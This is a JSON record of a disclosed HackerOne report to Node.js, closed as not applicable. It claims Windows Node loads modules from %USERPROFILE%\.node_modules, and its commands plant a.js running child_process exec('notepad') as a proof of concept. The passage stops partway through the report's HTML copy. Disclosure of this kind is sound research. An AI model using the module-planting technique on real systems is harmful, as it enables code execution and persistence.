{"id":629879,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk4Nzk=","url":"https://hackerone.com/reports/629879","title":"loader.js is not secure","state":"Closed","substate":"not-applicable","readable_substate":"N/A","created_at":"2019-06-26T07:59:20.338Z","submitted_at":"2019-06-26T07:59:20.338Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cdpython","url":"/cdpython","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-06-11T12:19:49.586Z","bug_reporter_agreed_on_going_public_at":"2020-06-11T12:19:49.543Z","team_member_agreed_on_going_public_at":"2020-01-14T23:42:26.713Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n\nNode.js `loader.js` can be exploited by an attacker \n\n## The vulnerability\n\n`https://github.com/nodejs/node/blob/a33c3c6d33fa81fa59a5aa95246d7f599e6abdd3/lib/internal/modules/cjs/loader.js#L892`\n\n```js\nModule._initPaths = function() {\n  var homeDir;\n  var nodePath;\n  if (isWindows) {\n    homeDir = process.env.USERPROFILE; //It can be vulnerable!\n    nodePath = process.env.NODE_PATH;\n  } else {\n    homeDir = safeGetenv('HOME');\n    nodePath = safeGetenv('NODE_PATH');\n  }\n\n  var prefixDir;\n\n  if (isWindows) {\n    prefixDir = path.resolve(process.execPath, '..');\n  } else {\n    prefixDir = path.resolve(process.execPath, '..', '..');\n  }\n  var paths = [path.resolve(prefixDir, 'lib', 'node')];\n\n  //can be easily exploited  \n  if (homeDir) {\n    paths.unshift(path.resolve(homeDir, '.node_libraries'));\n    paths.unshift(path.resolve(homeDir, '.node_modules'));\n  }\n\n  if (nodePath) {\n    paths = nodePath.split(path.delimiter).filter(function pathsFilterCB(path) {\n      return !!path;\n    }).concat(paths);\n  }\n\n  modulePaths = paths;\n\n  Module.globalPaths = modulePaths.slice(0);\n};\n```\n\n`loader.js` added `%userprofile\\.node_moduels` and `%userprofile\\.node_libraries` to globalPaths.\n\nIt means following behavior can occur easily when tries to `require`\n\nyou can test like below\n\n```js\nC:\\Users\\cdpyt\\OneDrive\\Desktop\\rce\u003enode -v\nv12.4.0\n\nC:\\Users\\cdpyt\\OneDrive\\Desktop\\rce\u003enode\nWelcome to Node.js v12.4.0.\nType \".help\" for more information.\n\u003e require('a')\nThrown:\nError: Cannot find module 'a'\nRequire stack:\n- \u003crepl\u003e\n    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:623:15)\n    at Function.Module._load (internal/modules/cjs/loader.js:527:27)\n    at Module.require (internal/modules/cjs/loader.js:681:19)\n    at require (internal/modules/cjs/helpers.js:16:16) {\n  code: 'MODULE_NOT_FOUND',\n  requireStack: [ '\u003crepl\u003e' ]\n}\n\u003e\n```\n\nIt looks like normal behavior. \n\nBut some side effect exists.\n\nF516992\n\nlet's test like below\n\n```cmd\nmkdir %userprofile%\\.node_modules\ncd %userprofile%\\.node_modules\necho const { exec } = require('child_process').exec(\"notepad\") \u003e a.js\n\nC:\\Users\\cdpyt\\.node_modules\u003edir\n C 드라이브의 볼륨에는 이름이 없습니다.\n 볼륨 일련 번호: 1AAF-F852\n\n C:\\Users\\cdpyt\\.node_modules 디렉터리\n\n2019-06-26  오후 04:01    \u003cDIR\u003e          .\n2019-06-26  오후 04:01    \u003cDIR\u003e          ..\n2019-06-26  오후 04:01                60 a.js\n               1개 파일                  60 바이트\n```\n\nrun node and `require('a')`\n\nF516991\n\nIt is a really serious bug because many software uses nodes on Windows systems!\n\n`node` will attempt to install the library file under the node_modules in the current path or in the initialized path using `npm init`.\n\na special case is global installation with `npm install -g [package names]`\n\nglobal installation uses `%appdata%\\npm` path.\n\n```cmd\nC:\\Users\\cdpyt\\.node_modules\u003ewhere eslint\nC:\\Users\\cdpyt\\AppData\\Roaming\\npm\\eslint\nC:\\Users\\cdpyt\\AppData\\Roaming\\npm\\eslint.cmd\n```\n\nSo, on a Windows system, `node` does not need to use `%userprofile\\.node_modules` and `%userprofile\\.node_libraries` paths in general cases.\n\n`node` has really powerful features on Windows. \n\nIf this bug is exploited by malicious code, AV can be easily bypassed.\n\n\n## Steps To Reproduce:\n\n  1. installation node latest version(v12.4.0) on windows\n  2. copy and paste below commands to `cmd.exe`\n        ``` cmd\n        mkdir %userprofile%\\.node_modules\n        cd %userprofile%\\.node_modules\n        echo const { exec } = require('child_process').exec(\"notepad\") \u003e a.js\n        ```\n  3. run node and type `requrie('a')`\n  4. notpad.exe will be poped!\n\n\n## Suggested fix\n\n- Fix the `loader.js` \n```js\nif (isWindows) {\n    //homeDir = process.env.USERPROFILE;\n    nodePath = process.env.NODE_PATH;\n  } else {\n    homeDir = safeGetenv('HOME');\n    nodePath = safeGetenv('NODE_PATH');\n  }\n```\n\n## Supporting Material/References:\nThe executables were downloaded from the official web site.\n\n```cmd\nC:\\Users\\cdpyt\\.node_modules\u003enode -v\nv12.4.0\n```\n\n## Impact\n\nIf `require` does not find the current path of the module, the node tries to search the global path.\n\n`%userprofile%` path allows you to create a new JavaScript file.\n\nIf the target application uses `node` or` electron` and does not do absolute path checking before `require` every time, it is dangerous for potential attacks.\n\nAttackers should target applications that fail to load library files. However, these behaviors are easy to find.\n\nAn attacker can create JavaScript files in a variety of ways. This is a more safe way to create pe files.\n\nAfter the creation to a specific path a javascript file, the target system will permanently infect.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eNode.js \u003ccode\u003eloader.js\u003c/code\u003e can be exploited by an attacker \u003c/p\u003e\n\n\u003ch2 id=\"the-vulnerability\"\u003eThe vulnerability\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://github.com/nodejs/node/blob/a33c3c6d33fa81fa59a5aa95246d7f599e6abdd3/lib/internal/modules/cjs/loader.js#L892\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eModule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e_initPaths\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003enodePath\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisWindows\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eUSERPROFILE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e//It can be vulnerable!\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003enodePath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eNODE_PATH\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003esafeGetenv\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eHOME\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003enodePath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003esafeGetenv\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eNODE_PATH\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eprefixDir\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisWindows\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eprefixDir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexecPath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e..\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eprefixDir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexecPath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e..\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e..\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprefixDir\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003elib\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enode\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)];\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e//can be easily exploited  \u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eunshift\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.node_libraries\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eunshift\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.node_modules\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enodePath\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003enodePath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edelimiter\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003efilter\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003epathsFilterCB\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e!!\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003econcat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003emodulePaths\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003eModule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eglobalPaths\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003emodulePaths\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eslice\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eloader.js\u003c/code\u003e added \u003ccode\u003e%userprofile\\.node_moduels\u003c/code\u003e and \u003ccode\u003e%userprofile\\.node_libraries\u003c/code\u003e to globalPaths.\u003c/p\u003e\n\n\u003cp\u003eIt means following behavior can occur easily when tries to \u003ccode\u003erequire\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eyou can test like below\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eC\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003eUsers\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003ecdpyt\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003eOneDrive\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003eDesktop\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003erce\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003enode\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003ev\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ev12\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mf\"\u003e4.0\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eC\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003eUsers\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003ecdpyt\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003eOneDrive\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003eDesktop\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e\u003cspan class=\"nx\"\u003erce\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003enode\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eWelcome\u003c/span\u003e \u003cspan class=\"nx\"\u003eto\u003c/span\u003e \u003cspan class=\"nx\"\u003eNode\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e \u003cspan class=\"nx\"\u003ev12\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"mf\"\u003e4.0\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eType\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.help\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"nx\"\u003emore\u003c/span\u003e \u003cspan class=\"nx\"\u003einformation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ea\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eThrown\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eError\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eCannot\u003c/span\u003e \u003cspan class=\"nx\"\u003efind\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ea\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eRequire\u003c/span\u003e \u003cspan class=\"nx\"\u003estack\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003erepl\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eat\u003c/span\u003e \u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eModule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e_resolveFilename\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einternal\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003emodules\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecjs\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eloader\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e623\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eat\u003c/span\u003e \u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eModule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e_load\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einternal\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003emodules\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecjs\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eloader\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e527\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eat\u003c/span\u003e \u003cspan class=\"nx\"\u003eModule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erequire\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einternal\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003emodules\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecjs\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eloader\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e681\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e19\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eat\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einternal\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003emodules\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ecjs\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ehelpers\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nl\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eMODULE_NOT_FOUND\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003erequireStack\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;repl\u0026gt;\u003c/span\u003e\u003cspan 